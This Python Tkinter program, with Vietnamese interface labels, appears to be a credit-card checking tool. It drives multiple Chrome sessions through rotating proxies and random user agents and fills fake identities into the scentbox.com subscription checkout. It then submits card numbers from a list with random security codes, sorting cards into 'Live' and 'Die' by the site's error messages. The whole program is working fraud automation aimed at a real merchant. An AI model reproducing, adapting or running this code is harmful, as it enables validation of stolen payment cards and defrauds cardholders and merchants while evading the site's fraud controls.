#! /usr/bin/env python
#  -*- coding: utf-8 -*-
#
# GUI module generated by PAGE version 6.2
#  in conjunction with Tcl version 8.6
#    Nov 08, 2021 05:33:51 PM +07  platform: Windows NT
import tkinter.messagebox
from tkinter import filedialog
import subprocess
from tkinter import *
import selenium
from selenium.common.exceptions import NoSuchWindowException,WebDriverException,TimeoutException
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import threading
import random
import time
import requests
from time import sleep
import threading
import sys
import os
try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True
CREATE_NO_WINDOW = 0x08000000
import seo_support

def vp_start_gui():
    '''Starting point when module is the main routine.'''
    global val, w, root
    root = tk.Tk()
    top = Toplevel1 (root)
    seo_support.init(root, top)
    root.mainloop()

w = None
def create_Toplevel1(rt, *args, **kwargs):
    '''Starting point when module is imported by another module.
       Correct form of call: 'create_Toplevel1(root, *args, **kwargs)' .'''
    global w, w_win, root
    #rt = root
    root = rt
    w = tk.Toplevel (root)
    top = Toplevel1 (w)
    seo_support.init(w, top, *args, **kwargs)
    return (w, top)

def destroy_Toplevel1():
    global w
    w.destroy()
    w = None

class Toplevel1:
    def __init__(self, top=None):
        self.check = 0
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'
        self.style = ttk.Style()
        if sys.platform == "win32":
            self.style.theme_use('winnative')
        self.style.configure('.',background=_bgcolor)
        self.style.configure('.',foreground=_fgcolor)
        self.style.configure('.',font="TkDefaultFont")
        self.style.map('.',background=
            [('selected', _compcolor), ('active',_ana2color)])

        top.geometry("630x606+670+213")
        top.minsize(120, 1)
        top.maxsize(1924, 1061)
        top.resizable(1,  1)
        top.title("Cratejoy")
        top.configure(background="#d9d9d9")
        top.configure(highlightbackground="#d9d9d9")
        top.configure(highlightcolor="black")

        self.TEntry1 = ttk.Entry(top)
        self.TEntry1.place(relx=0.238, rely=0.035, relheight=0.035
                , relwidth=0.168)
        self.TEntry1.configure(takefocus="")
        self.TEntry1.configure(cursor="ibeam")

        self.TLabel1 = ttk.Label(top)
        self.TLabel1.place(relx=0.032, rely=0.035, height=24, width=112)
        self.TLabel1.configure(background="#d9d9d9")
        self.TLabel1.configure(foreground="#000000")
        self.TLabel1.configure(relief="flat")
        self.TLabel1.configure(anchor='w')
        self.TLabel1.configure(justify='left')
        self.TLabel1.configure(text='''Số luồng:''')

        self.TButton1 = ttk.Button(top)
        self.TButton1.place(relx=0.651, rely=0.931, height=35, width=76)
        self.TButton1.configure(takefocus="")
        self.TButton1.configure(text='''Start''',command=self.start)

        self.TButton2 = ttk.Button(top)
        self.TButton2.place(relx=0.81, rely=0.931, height=35, width=76)
        self.TButton2.configure(takefocus="")
        self.TButton2.configure(text='''Stop''',command = self.stop)

        self.TButton3 = ttk.Button(top)
        self.TButton3.place(relx=0.24, rely=0.117, height=25, width=106)
        self.TButton3.configure(takefocus="")
        self.TButton3.configure(text='''API Tinsoft''',command = self.open_fileApiTinsoft)

        self.TButton4 = ttk.Button(top)
        self.TButton4.place(relx=0.24, rely=0.21, height=25, width=106)
        self.TButton4.configure(takefocus="")
        self.TButton4.configure(text='''File card''',command = self.open_fileCard)

        self.menubar = tk.Menu(top,font="TkMenuFont",bg=_bgcolor,fg=_fgcolor)
        top.configure(menu = self.menubar)

        self.TLabel2 = ttk.Label(top)
        self.TLabel2.place(relx=0.206, rely=0.924, height=25, width=256)
        self.TLabel2.configure(background="#d9d9d9")
        self.TLabel2.configure(foreground="#000000")
        self.TLabel2.configure(relief="flat")
        self.TLabel2.configure(anchor='w')
        self.TLabel2.configure(justify='left')
        self.TLabel2.configure(text='''Check Success''')

        self.checkbox_test = IntVar()
        self.style.map('TCheckbutton',background=
            [('selected', _bgcolor), ('active', _ana2color)])
        self.TCheckbutton1 = ttk.Checkbutton(top)
        self.TCheckbutton1.place(relx=0.476, rely=0.017, relwidth=0.032
                , relheight=0.0, height=28)
        self.TCheckbutton1.configure(variable = self.checkbox_test)


        self.Labelframe1 = tk.LabelFrame(top)
        self.Labelframe1.place(relx=0.508, rely=0.017, relheight=0.261
                , relwidth=0.451)
        self.Labelframe1.configure(relief='groove')
        self.Labelframe1.configure(foreground="black")
        self.Labelframe1.configure(text='''Random từ mẫu''')
        self.Labelframe1.configure(background="#d9d9d9")
        self.Labelframe1.configure(highlightbackground="#d9d9d9")
        self.Labelframe1.configure(highlightcolor="black")

        self.TEntry4 = ttk.Entry(self.Labelframe1)
        self.TEntry4.place(relx=0.563, rely=0.38, relheight=0.133, relwidth=0.366
                , bordermode='ignore')
        self.TEntry4.configure(takefocus="")
        self.TEntry4.configure(cursor="fleur")

        self.TLabel3 = ttk.Label(self.Labelframe1)
        self.TLabel3.place(relx=0.035, rely=0.38, height=21, width=99
                , bordermode='ignore')
        self.TLabel3.configure(background="#d9d9d9")
        self.TLabel3.configure(foreground="#000000")
        self.TLabel3.configure(relief="flat")
        self.TLabel3.configure(anchor='w')
        self.TLabel3.configure(justify='left')
        self.TLabel3.configure(text='''Số ký tự random''')

        self.TLabel4 = ttk.Label(self.Labelframe1)
        self.TLabel4.place(relx=0.035, rely=0.57, height=21, width=135
                , bordermode='ignore')
        self.TLabel4.configure(background="#d9d9d9")
        self.TLabel4.configure(foreground="#000000")
        self.TLabel4.configure(relief="flat")
        self.TLabel4.configure(anchor='w')
        self.TLabel4.configure(justify='left')
        self.TLabel4.configure(text='''Số lượng random/ card''')

        self.TEntry5 = ttk.Entry(self.Labelframe1)
        self.TEntry5.place(relx=0.563, rely=0.57, relheight=0.133, relwidth=0.373
                , bordermode='ignore')
        self.TEntry5.configure(takefocus="")
        self.TEntry5.configure(cursor="ibeam")

        self.TLabel5 = ttk.Label(self.Labelframe1)
        self.TLabel5.place(relx=0.035, rely=0.759, height=22, width=115
                , bordermode='ignore')
        self.TLabel5.configure(background="#d9d9d9")
        self.TLabel5.configure(foreground="#000000")
        self.TLabel5.configure(relief="flat")
        self.TLabel5.configure(anchor='w')
        self.TLabel5.configure(justify='left')
        self.TLabel5.configure(text='''Số lần check 1 acc''')

        self.TEntry6 = ttk.Entry(self.Labelframe1)
        self.TEntry6.place(relx=0.563, rely=0.759, relheight=0.133
                , relwidth=0.373, bordermode='ignore')
        self.TEntry6.configure(takefocus="")
        self.TEntry6.configure(cursor="ibeam")

        self.TLabel6 = ttk.Label(self.Labelframe1)
        self.TLabel6.place(relx=0.035, rely=0.19, height=21, width=115
                , bordermode='ignore')
        self.TLabel6.configure(background="#d9d9d9")
        self.TLabel6.configure(foreground="#000000")
        self.TLabel6.configure(font="TkDefaultFont")
        self.TLabel6.configure(relief="flat")
        self.TLabel6.configure(anchor='w')
        self.TLabel6.configure(justify='left')
        self.TLabel6.configure(text='''Thẻ mẫu''')

        self.TEntry7 = ttk.Entry(self.Labelframe1)
        self.TEntry7.place(relx=0.563, rely=0.19, relheight=0.139, relwidth=0.373
                , bordermode='ignore')
        self.TEntry7.configure(takefocus="")
        self.TEntry7.configure(cursor="ibeam")

        self.TEntry2 = ttk.Entry(top)
        self.TEntry2.place(relx=0.032, rely=0.12, relheight=0.036, relwidth=0.2)
        self.TEntry2.configure(takefocus="")
        self.TEntry2.configure(cursor="ibeam")

        self.TEntry3 = ttk.Entry(top)
        self.TEntry3.place(relx=0.032, rely=0.206, relheight=0.036, relwidth=0.2)

        self.TEntry3.configure(takefocus="")
        self.TEntry3.configure(cursor="ibeam")

        self.style.configure('Treeview',  font="TkDefaultFont")
        self.Scrolledtreeview1 = ScrolledTreeView(top)

        self.Scrolledtreeview1.place(relx=0.048, rely=0.281, relheight=0.581
                , relwidth=0.905)

        self.Scrolledtreeview1['columns'] = ('Proxy', 'Card', 'Progress', 'Status')
        # Format column
        self.Scrolledtreeview1.column("#0", width=30, minwidth=10)
        self.Scrolledtreeview1.column('Proxy', anchor=W, width=120)
        self.Scrolledtreeview1.column('Card', anchor=W, width=130)
        self.Scrolledtreeview1.column("Progress", anchor=W, width=120)
        self.Scrolledtreeview1.column("Status", anchor=W, width=50)

        # Creating heading
        self.Scrolledtreeview1.heading("#0", text="Index", anchor=W)
        self.Scrolledtreeview1.heading("Proxy", text="Proxy", anchor=W)
        self.Scrolledtreeview1.heading("Card", text="Card", anchor=W)
        self.Scrolledtreeview1.heading("Progress", text="Progress", anchor=W)
        self.Scrolledtreeview1.heading("Status", text="Status", anchor=W)

        self.TButton5 = ttk.Button(top)
        self.TButton5.place(relx=0.048, rely=0.941, height=25, width=76)
        self.TButton5.configure(takefocus="")
        self.TButton5.configure(text='''Account''',command = self.Account)

        self.TButton6 = ttk.Button(top)
        self.TButton6.place(relx=0.048, rely=0.891, height=25, width=76)
        self.TButton6.configure(takefocus="")
        self.TButton6.configure(text='''Card live''',command = self.cardLive)
        self.once = 0
        self.exception = False

    def randomMail(self):
        print(self.checkbox_test.get())

    def Account(self):
        os.startfile('account.txt')

    def cardLive(self):
            os.startfile('success.txt')

    def open_fileApiTinsoft(self):
        self.fileApiTinsoft = filedialog.askopenfilename()
        self.TEntry2.insert(INSERT,self.fileApiTinsoft)

    def open_fileCard(self):
        self.fileCard = filedialog.askopenfilename()
        self.TEntry3.insert(INSERT,self.fileCard)

    def start(self):
        self.once +=1
        self.exception = False
        if self.once == 1:
            threading.Thread(target=self.da_luong).start()

    def da_luong(self):
        while True:
            while self.exception == True:
                sleep(1)
            if self.check == 0:
                print('once: ' + str(self.once))
                for i in range(int(self.TEntry1.get())):
                        threading.Thread(target=self.checkCard,args=(i,)).start()
                        sleep(3)

    def stop(self):
        def stop():
            for x in range(int(self.TEntry1.get())):
                self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                        values=('', 'Đang lấy', 'Stopped', 'None'))
        threading.Thread(target=stop).start()
        self.exception = True
        subprocess.call('Taskkill /IM chrome.exe /F',shell=True,creationflags=0x08000000)

    def checkCard(self,x):
        time = ['0.1', '0.2', '1.3', '0.4', '1.5', '1.6', '1.7', '0.8', '1.9', '1.10', '1.11', '0.12', '0.13', '0.14', '0.15', '1.16', '0.17', '0.18', '1.19', '1.20', '0.21', '1.22', '1.23', '1.24', '0.25', '1.26', '1.27', '0.28', '1.29', '1.30', '0.31', '0.32', '0.33', '1.34', '1.35', '1.36', '1.37', '0.38', '1.39', '0.40', '1.41', '0.42', '1.43', '0.44', '1.45', '1.46', '0.47', '1.48', '0.49', '1.50', '1.51', '0.52', '1.53', '1.54', '0.55', '1.56', '0.57', '0.58', '0.59', '1.60', '1.61', '0.62', '0.63', '0.64', '1.65', '0.66', '0.67', '1.68', '0.69', '1.70', '0.71', '0.72', '0.73', '1.74', '0.75', '1.76', '1.77', '1.78', '0.79', '1.80', '1.81', '1.82', '0.83', '1.84', '0.85', '0.86', '0.87', '0.88', '1.89', '1.90', '1.91', '0.92', '0.93', '1.94', '0.95', '1.96', '0.97', '0.98', '0.99', '0.100']

        self.check += 1
        # Check total
        def checkSuccess():
            with open(self.fileCard, 'r') as file:
                cardList = list(dict.fromkeys(file.read().split('\n')))


            for i in range(1000000000):
                try:
                    cardList.remove('')
                except:
                    break

            # Check fail
            with open('failed.txt', 'r') as file:
                failList = file.read().split('\n')
            for i in range(1000000000):
                try:
                    failList.remove('')
                except:
                    break

            # Check total
            with open('success.txt', 'r') as file:
                successList = file.read().split('\n')
            for i in range(1000000000):
                try:
                    successList.remove('')
                except:
                    break
            self.TLabel2.configure(text=f'Total: {len(list(dict.fromkeys(cardList)))}|Fail: {len(failList)} |Success: {len(successList)} |Done: {len(failList)+len(successList)}')

        checkSuccess()
        try:
            # Get proxy
            with open(self.fileApiTinsoft, 'r') as file:
                listProxy = file.read().split('\n')

            if (x + 1) % len(listProxy) == 0:
                indexProxy = len(listProxy) - 1
            else:
                indexProxy = (x + 1) % len(listProxy) - 1

            while True:
                requestsTinsoft = requests.get(
                    f'http://proxy.tinsoftsv.com/api/changeProxy.php?key={listProxy[indexProxy]}')
                Proxy_json = requestsTinsoft.json()
                if Proxy_json['success'] == True:
                    proxy = Proxy_json['proxy']
                    print(proxy)
                    break
                elif Proxy_json['success'] == False:
                    print(Proxy_json['next_change'])
                    # Tree view
                    try:
                        self.Scrolledtreeview1.insert(parent='', index='end', iid=x, text=f'{x + 1}',
                                                      values=(
                                                      'Đang lấy', 'Đang lấy', f'Nghỉ {Proxy_json["next_change"]}s',
                                                      'None'))
                    except:
                        self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}", values=(
                        'Đang lấy', 'Đang lấy', f'Nghỉ {Proxy_json["next_change"]}s', 'None'))

                    for i in range(Proxy_json['next_change'] + 2):
                        sleep(1)
                        if self.exception == True:
                            raise WebDriverException

            print(proxy)

            # UA
            with open('UA.txt', 'r') as file:
                listUA = file.read().split('\n')

            # Card
            with open(self.fileCard, 'r') as file:
                fileCard = file.read().split('\n')
            # for i in fileCard

            # Treeview
            try:
                self.Scrolledtreeview1.insert(parent='', index='end', iid=x, text=f'{x + 1}',
                                              values=(proxy, 'Đang lấy', 'Open Chrome', 'None'))
            except:
                self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                            values=(proxy, 'Đang lấy', 'Open Chrome', 'None'))

            # Chrome
            args = ["hide_console", ]
            chrome_options = webdriver.ChromeOptions()
            chrome_prefs = {}
            chrome_options.experimental_options["prefs"] = chrome_prefs
            chrome_prefs["profile.default_content_settings"] = {"javascript": 2}
            chrome_prefs["profile.managed_default_content_settings"] = {"javascript": 2}
            prefs = {"profile.managed_default_content_settings.images": 2}
            chrome_options.add_experimental_option("prefs", prefs)
            chrome_options.add_argument(f"user-agent={random.choice(listUA)}")
            chrome_options.add_argument(f'--proxy-server={proxy}')
            driver = webdriver.Chrome(options=chrome_options, service_args=args)
            driver.set_window_size(240, 360)
            driver.set_window_position(x * 240, 0)


            #FAke information
            information = requests.get('https://random-data-api.com/api/users/random_user?size=1')
            print(information.json())
            data = information.json()
            firstname = data[0]['first_name']
            lastname = data[0]['last_name']
            gmail = data[0]['email']
            address = data[0]['address']
            print(address['city'])
            # tkinter.messagebox.showinfo(message='line 409')
            password = str(random.randint(1000000000, 999999999999))
            phone = '206'
            for i in range(7):
                phone += str(random.randint(0, 9))
            # tkinter.messagebox.showinfo(message='line 411')
            with open('UA.txt', 'r') as file:
                listUA = file.read().split('\n')


            # get to web
            self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}", values=(proxy,'Đang lấy', 'Go to https://www.scentbox.com', 'None'))
            driver.get('https://www.scentbox.com/cart/basket.cfm?subscription_type=1&function=list')
            if self.exception == True:
                raise WebDriverException

            # Wait to signup
            self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                               values=(proxy,'Đang lấy', 'Điền thông tin cá nhân','None'))
            if self.exception == True:
                raise WebDriverException

            print(WebDriverWait(driver, 5, poll_frequency=0.1).until(EC.presence_of_element_located((By.NAME, 'email'))).send_keys(gmail))
            driver.execute_script('document.querySelectorAll("button")[3].click()')
            sleep(3)
            driver.refresh()

            # Fill
            WebDriverWait(driver, 5, poll_frequency=0.1).until(EC.presence_of_element_located((By.NAME, 'ShipFName')))
            driver.find_element_by_name('ShipFName').send_keys(firstname)
            driver.find_element_by_name('ShipLName').send_keys(lastname)
            driver.find_element_by_name('ShipAddress1').send_keys(address['street_address'])
            driver.find_element_by_name('ShipCity').send_keys(address['city'])
            driver.find_element_by_name('ShipState').send_keys(address['state'])
            driver.find_element_by_name('ShipZip').send_keys(address['zip_code'])
            driver.find_element_by_name('EMail').send_keys(gmail)
            driver.find_element_by_name('Phone').send_keys(phone)
            driver.execute_script('document.querySelectorAll("#ScentPreference")[0].value = "M"')
            with open('account.txt','a') as file:
                file.write(gmail+'|'+password+'\n')
            if self.exception == True:
                raise WebDriverException


            # Card
            for k in range(4):
                if self.exception == True:
                    raise WebDriverException
                checkSuccess()
                with open(self.fileCard, 'r') as file:
                    cardList = list(dict.fromkeys(file.read().split('\n')))
                cardCheck = cardList[0]
                cardList.remove(cardList[0])
                for i in range(1000000000):
                    try:
                        dict.fromkeys(file.read().split('\n')).remove('')
                    except: break

                #Clear file
                open('card.txt', 'w').write('')
                with open('card.txt', 'a') as file:
                    for i in list(dict.fromkeys(cardList)):
                        file.write(i + '\n')

                cardID = cardCheck.split('|')[0]
                monthExpired = cardCheck.split('|')[1]
                yearExpired = cardCheck.split('|')[2].replace('20', '')
                self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                   values=(proxy, cardID, f'Điền thông tin thẻ thứ {k+1}','None'))

                if self.exception == True:
                    raise WebDriverException

                sleep(2)
                try:
                    driver.find_element_by_name('Password').clear()
                except:
                    pass
                driver.find_element_by_name('Password').send_keys(data[0]['password'])
                driver.find_element_by_name('SecurityCode').clear()
                driver.find_element_by_name('SecurityCode').send_keys(random.randint(100, 999))
                driver.find_element_by_name('BillingZip').clear()
                driver.find_element_by_name('BillingZip').send_keys(address['zip_code'])
                driver.find_element_by_name('CCNumber').clear()
                driver.find_element_by_name('CCNumber').send_keys(cardID)
                driver.execute_script(f'document.querySelectorAll("select.form-control")[1].value = "{monthExpired}"')
                driver.execute_script(f'document.querySelectorAll("select.form-control")[2].value = "{yearExpired}"')
                if k == 0:
                    driver.execute_script('document.querySelector("input[type=checkbox]").click()')

                if self.exception == True:
                    raise WebDriverException

                for i in range(3):
                    try:
                        driver.find_element_by_name('Submit_Order').click()
                    except:
                        sleep(0.5)


                if self.exception == True:
                    raise WebDriverException

                sleep(2)
                if 'placeholder="First Name"' in driver.page_source:
                    with open(self.fileCard,'a') as file:
                        file.write(cardCheck + '\n')
                    raise FileNotFoundError
                elif 'The verification code you entered did not match what was on file for your credit card' in driver.page_source:
                    with open('success.txt', 'a') as file:
                        file.write(cardCheck + '\n')
                    driver.execute_script('javascript: history.go (-1)')
                    self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                       values=(proxy, cardID, f'Check xong', 'Live'))
                elif 'Due to security reasons' in driver.page_source:
                    with open('failed.txt', 'a') as file:
                        file.write(cardCheck + '\n')
                    self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                       values=(proxy, cardID, f'Check xong', 'Die'))
                    driver.refresh()
                else:
                    with open('failed.txt', 'a') as file:
                        file.write(cardCheck + '\n')
                    self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                       values=(proxy, cardID, f'Check xong', 'Die'))
                    driver.execute_script('javascript: history.go (-1)')
                    sleep(2)
                    driver.execute_script("window.stop();")


                if self.exception == True:
                    raise WebDriverException
            driver.quit()
            self.check -=1


        except selenium.common.exceptions.WebDriverException:
            if self.exception == True:
                self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}",
                                            values=('', 'Đang lấy', 'Stopped', 'None'))
            else:
                self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}", values=(proxy, 'Đang lấy','Lỗi proxy','None'))
            try:
                with open(self.fileCard,'a') as file:
                    file.write(cardCheck + '\n')
            except:
                pass
            try:
                driver.quit()
            except:
                pass
            self.check -= 1
        except:
            self.Scrolledtreeview1.item(self.Scrolledtreeview1.get_children()[x], text=f"{x + 1}", values=(proxy, 'Đang lấy','Lỗi','None'))
            sleep(2)
            try:
                driver.quit()
            except:
                pass
            self.check -= 1


# The following code is added to facilitate the Scrolled widgets you specified.
class AutoScroll(object):
    '''Configure the scrollbars for a widget.'''
    def __init__(self, master):
        #  Rozen. Added the try-except clauses so that this class
        #  could be used for scrolled entry widget for which vertical
        #  scrolling is not supported. 5/7/14.
        try:
            vsb = ttk.Scrollbar(master, orient='vertical', command=self.yview)
        except:
            pass
        hsb = ttk.Scrollbar(master, orient='horizontal', command=self.xview)
        try:
            self.configure(yscrollcommand=self._autoscroll(vsb))
        except:
            pass
        self.configure(xscrollcommand=self._autoscroll(hsb))
        self.grid(column=0, row=0, sticky='nsew')
        try:
            vsb.grid(column=1, row=0, sticky='ns')
        except:
            pass
        hsb.grid(column=0, row=1, sticky='ew')
        master.grid_columnconfigure(0, weight=1)
        master.grid_rowconfigure(0, weight=1)
        # Copy geometry methods of master  (taken from ScrolledText.py)
        if py3:
            methods = tk.Pack.__dict__.keys() | tk.Grid.__dict__.keys() \
                  | tk.Place.__dict__.keys()
        else:
            methods = tk.Pack.__dict__.keys() + tk.Grid.__dict__.keys() \
                  + tk.Place.__dict__.keys()
        for meth in methods:
            if meth[0] != '_' and meth not in ('config', 'configure'):
                setattr(self, meth, getattr(master, meth))

    @staticmethod
    def _autoscroll(sbar):
        '''Hide and show scrollbar as needed.'''
        def wrapped(first, last):
            first, last = float(first), float(last)
            if first <= 0 and last >= 1:
                sbar.grid_remove()
            else:
                sbar.grid()
            sbar.set(first, last)
        return wrapped

    def __str__(self):
        return str(self.master)

def _create_container(func):
    '''Creates a ttk Frame with a given master, and use this new frame to
    place the scrollbars and the widget.'''
    def wrapped(cls, master, **kw):
        container = ttk.Frame(master)
        container.bind('<Enter>', lambda e: _bound_to_mousewheel(e, container))
        container.bind('<Leave>', lambda e: _unbound_to_mousewheel(e, container))
        return func(cls, container, **kw)
    return wrapped

class ScrolledTreeView(AutoScroll, ttk.Treeview):
    '''A standard ttk Treeview widget with scrollbars that will
    automatically show/hide as needed.'''
    @_create_container
    def __init__(self, master, **kw):
        ttk.Treeview.__init__(self, master, **kw)
        AutoScroll.__init__(self, master)

import platform
def _bound_to_mousewheel(event, widget):
    child = widget.winfo_children()[0]
    if platform.system() == 'Windows' or platform.system() == 'Darwin':
        child.bind_all('<MouseWheel>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Shift-MouseWheel>', lambda e: _on_shiftmouse(e, child))
    else:
        child.bind_all('<Button-4>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Button-5>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Shift-Button-4>', lambda e: _on_shiftmouse(e, child))
        child.bind_all('<Shift-Button-5>', lambda e: _on_shiftmouse(e, child))

def _unbound_to_mousewheel(event, widget):
    if platform.system() == 'Windows' or platform.system() == 'Darwin':
        widget.unbind_all('<MouseWheel>')
        widget.unbind_all('<Shift-MouseWheel>')
    else:
        widget.unbind_all('<Button-4>')
        widget.unbind_all('<Button-5>')
        widget.unbind_all('<Shift-Button-4>')
        widget.unbind_all('<Shift-Button-5>')

def _on_mousewheel(event, widget):
    if platform.system() == 'Windows':
        widget.yview_scroll(-1*int(event.delta/120),'units')
    elif platform.system() == 'Darwin':
        widget.yview_scroll(-1*int(event.delta),'units')
    else:
        if event.num == 4:
            widget.yview_scroll(-1, 'units')
        elif event.num == 5:
            widget.yview_scroll(1, 'units')

def _on_shiftmouse(event, widget):
    if platform.system() == 'Windows':
        widget.xview_scroll(-1*int(event.delta/120), 'units')
    elif platform.system() == 'Darwin':
        widget.xview_scroll(-1*int(event.delta), 'units')
    else:
        if event.num == 4:
            widget.xview_scroll(-1, 'units')
        elif event.num == 5:
            widget.xview_scroll(1, 'units')

if __name__ == '__main__':
    vp_start_gui()





